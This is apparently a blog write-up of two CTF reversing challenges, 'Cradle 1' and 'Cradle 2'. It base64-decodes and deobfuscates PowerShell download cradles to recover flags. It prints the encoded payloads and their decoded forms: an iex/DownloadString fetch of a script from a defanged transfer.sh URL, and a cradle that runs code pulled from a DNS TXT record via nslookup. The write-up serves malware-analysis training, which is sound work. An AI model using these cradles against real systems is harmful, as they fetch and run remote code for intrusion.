---
title: "Cradle 1&2"
date: 2024-07-01T13:11:20-10:01
tags: ['CTF','Writeups','Reversing','Medium']
---


# [Home](https://jjolley91.github.io/blog/) >

###  [Cyber Defense CTF](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/) >  [Reversing](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/Reversing/)

## [Back](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/Reversing/)  <> [Next](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/Reversing/flag_worthy)

## Cradle 1

### McSkiddy considers himself a connoisseur of all things PowerShell for initial access. He even found a nifty tool that automagically obfuscates scripts! Surely with this, the secrets of his tradecraft will be known to him alone...right?

### Can you prove him wrong by uncovering what this script of his does?

```ps
powershell -nop -enc "LgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBpACcALAAnAGUAeAAnACkAIAAoACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAE4AZQB3AC0AJwAsACcATwBiAGoAZQAnACwAJwBjAHQAJwApACAAUwB5AHMAdABgAGUAbQBbAC4AXQBuAGAARQBgAFQAWwAuAF0AdwBFAEIAYwBsAGkAYABlAG4AdAApAC4AIgBEAG8AVwBOAEwAYABvAEEARABzAGAAVABgAFIAaQBgAE4AZwAiACgAJwBoAHgAeABwAHMAWwA6AC8ALwBdAHQAcgBhAG4AcwBmAGUAcgBbAC4AXQBzAGgALwAoACgAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsANwB9AHsANgB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBmACAAJwAnAHMAZQBjACcAJwAsACcAJwB7AG4AbwB0AF8AcwBvAF8AJwAnACwAJwAnAGUAJwAnACwAJwAnAGMAcgBhAGYAdAAnACcALAAnACcAbABlAHYAZQBsAGUAZgBmAGUAYwB0ACcAJwAsACcAJwB9ACcAJwAsACcAJwB0AHIAYQBkACcAJwAsACcAJwByAGUAdABfACcAJwApACkAKQAvAGEAWwAuAF0AcABzADEAJwApACkA"
```
For this challenge, we are given an encoded powershell string to deobfuscate.


```ps
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBpACcALAAnAGUAeAAnACkAIAAoACgALgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAE4AZQB3AC0AJwAsACcATwBiAGoAZQAnACwAJwBjAHQAJwApACAAUwB5AHMAdABgAGUAbQBbAC4AXQBuAGAARQBgAFQAWwAuAF0AdwBFAEIAYwBsAGkAYABlAG4AdAApAC4AIgBEAG8AVwBOAEwAYABvAEEARABzAGAAVABgAFIAaQBgAE4AZwAiACgAJwBoAHgAeABwAHMAWwA6AC8ALwBdAHQAcgBhAG4AcwBmAGUAcgBbAC4AXQBzAGgALwAoACgAKAAiAHsANAB9AHsAMQB9AHsAMAB9AHsANwB9AHsANgB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBmACAAJwAnAHMAZQBjACcAJwAsACcAJwB7AG4AbwB0AF8AcwBvAF8AJwAnACwAJwAnAGUAJwAnACwAJwAnAGMAcgBhAGYAdAAnACcALAAnACcAbABlAHYAZQBsAGUAZgBmAGUAYwB0ACcAJwAsACcAJwB9ACcAJwAsACcAJwB0AHIAYQBkACcAJwAsACcAJwByAGUAdABfACcAJwApACkAKQAvAGEAWwAuAF0AcABzADEAJwApACkA"))
```
This gets us our first output: 

```ps
.("{0}{1}"-f'i','ex') ((.("{0}{1}{2}" -f'New-','Obje','ct') Syst`em[.]n`E`T[.]wEBcli`ent)."DoWNL`oADs`T`Ri`Ng"('hxxps[://]transfer[.]sh/((("{4}{1}{0}{7}{6}{2}{3}{5}"-f ''sec'',''{not_so_'',''e'',''craft'',''leveleffect'',''}'',''trad'',''ret_'')))/a[.]ps1'))
```
So next, we can simply write out the flag by reading each index from the list in order! (Don't forget it starts with 0)

```ps
{4}{1}{0}{7}{6}{2}{3}{5}"-f ''sec'',''{not_so_'',''e'',''craft'',''leveleffect'',''}'',''trad'',''ret_'
```

4=leveleffect

1={not_so_

0=sec

7=ret_

etc...

## Cradle 2

### Seeing as the last download cradle was busted so easily, McSkiddy threw quite a few more obfuscation techniques into this one. He's sure of his work now.

### Can you drill through to find the core behavior of this downloader?

```ps
poWeRShElL -nOp -EnC "JABhAD0AKAAxADIAMAAgACwANwAsACAAMwA3ACwAIAAxADEANwAsADEAOQAgACwAMQAxADQAIAAsACAAMgA1ACwAIAA1ADkALAAxADEANgAsACAANgAsADIANwApADsAJAByAD0AKAAoACAAWwBjAEgAQQBSAFsAXQBdACAAKAAkAGEAKQAgAHwARgBPAHIARQBBAGMAaAAgAHsAIABbAGMASABBAFIAXQAoACQAXwAtAGIAWABvAHIAIgAwAHgANAAxACIAIAApACAAfQAgACkAIAAtAEoATwBpAG4AJwAnACkAOwAkAHMAPQAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaABlAHMAKAAoACIAewAwAH0AewAxADIAfQB7ADQAfQB7ADEAMAB9AHsAMwB9AHsAMQB9AHsAOAB9AHsAMgB9AHsANwB9AHsANgB9AHsAMQAxAH0AewA1AH0AewA5AH0AIgAtAGYAIAAnAD0APQBRAGYAegAnACwAJAB7AHIAfQAsACcASABaAGgAOQBHACcALAAnAHkAJwAsACcAYwB2AE4AVwAnACwAJwBaADIAVgBHACcALAAnAGwAJwAsACcAYgA1AEYARwBjADcAUgAzAFkAJwAsACcAZgA1AFcAYQBmAE4AJwAsACcAYgAnACwAJwBaACcALAAnAFoAbQBaAGwAeABXACcALAAnAFIAbQAnACkALAAnAC4AJwAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAUgBpAGcAaAB0AFQAJwAsACcAbwAnACwAJwBMAGUAZgB0ACcAKQApAHwARgBgAE8AcgBFAEEAYwBoACAAewAkAF8ALgB2AGEAbAB1AGUAfQApACAALQBqAG8AaQBuACAAJwAnACkAKQApADsAaQBgAGUAeAAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAKABOAFMAYABMAGAAbwBvAGsAVQBQACAALQBxAHUAZQByAHkAdAB5AHAAZQA9AHQAeAB0ACAAJABzACAAPgAkAG4AdQBsAGwAIAAyAD4AJgAxAHwAIABTAEUATABFAGMAVABgAC0AUwB0AGAAUgBpAGAATgBHACAALQBQAGEAdAB0AGUAcgBuACAAJwAiACoAIgAnACkAIAAtAHMAcABsAGkAdAAgACcAIgAnAFsAMABdACkAKQApACkA"
```

Again, we can start by base64 decoding the payload. After that we get:
```ps
$a=(120 ,7, 37, 117,19 ,114 , 25, 59,116, 6,27);$r=(( [cHAR[]] ($a) |FOrEAch { [cHAR]($_-bXor"0x41" ) } ) -JOin'');$s=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([regex]::Matches(("{0}{12}{4}{10}{3}{1}{8}{2}{7}{6}{11}{5}{9}"-f '==Qfz',${r},'HZh9G','y','cvNW','Z2VG','l','b5FGc7R3Y','f5WafN','b','Z','ZmZlxW','Rm'),'.',("{0}{1}{2}" -f'RightT','o','Left'))|F`OrEAch {$_.value}) -join '')));i`ex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((NS`L`ookUP -querytype=txt $s >$null 2>&1| SELEcT`-St`Ri`NG -Pattern '"*"') -split '"'[0]))))
```
We can see they have added a few extra steps to their obfuscation techniques, however we can just use powershell to bypass all of that to get to the flag.

We can paste each of the variables from here, which are delineated by a semi-colon ';' directly into powershell stopping before the iex section and receive the flag!

![cradle_2](https://github.com/jjolley91/blog/tree/main/static/le_ctf_24/cradle_2.png?raw=true)

## [Back](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/Reversing/)  <> [Next](https://jjolley91.github.io/blog/level_effect_cyber_defense_ctf_2024/Reversing/flag_worthy)